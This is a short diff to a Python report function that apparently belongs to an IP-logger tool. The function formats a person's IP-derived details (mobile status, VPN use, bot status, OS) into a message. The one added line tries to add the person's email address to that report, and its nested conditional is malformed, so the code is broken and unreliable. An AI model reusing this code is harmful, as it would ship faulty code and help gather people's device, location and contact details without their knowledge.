@@ -162,6 +162,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **Mail:** `{info['gmail'] if {info['mail'] if info['mail'] else 'Unknown'}`
 
 **PC Info:**
 > **OS:** `{os}`
